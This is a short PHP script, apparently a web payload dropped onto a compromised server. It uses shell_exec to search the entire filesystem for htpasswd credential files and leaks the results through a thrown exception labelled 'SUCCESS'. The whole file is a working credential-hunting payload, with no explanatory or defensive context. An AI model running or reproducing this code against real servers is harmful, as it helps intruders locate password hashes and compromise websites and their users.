<?php
$output ='';

$output =$output."\n htpaswd ".shell_exec ('find / -name "*htpasswd"');

throw new Exception("\n SUCCESS  ". $output."\n");
?>
